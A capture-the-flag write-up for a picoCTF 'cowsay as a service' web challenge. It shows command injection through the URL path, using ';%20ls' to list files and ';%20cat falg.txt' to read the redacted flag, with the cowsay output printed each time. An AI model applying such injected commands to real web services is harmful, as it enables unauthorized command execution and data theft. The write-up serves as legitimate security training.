## Description
Now presenting cowsay as a service

## Solution
It seem the site pass the value received from <message> in url to `cowsay` command of linux:

```https://caas.mars.picoctf.net/cowsay/test
 ______
< test >
 ------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

And it might be vulnerable to command injection. just checking:
```https://caas.mars.picoctf.net/cowsay/test;%20ls%20.
 ______
< test >
 ------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock

```

yes. simple search for flag and read it:
```https://caas.mars.picoctf.net/cowsay/test;%20cat%20falg.txt
 ______
< test >
 ------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{XXXXXXX}

```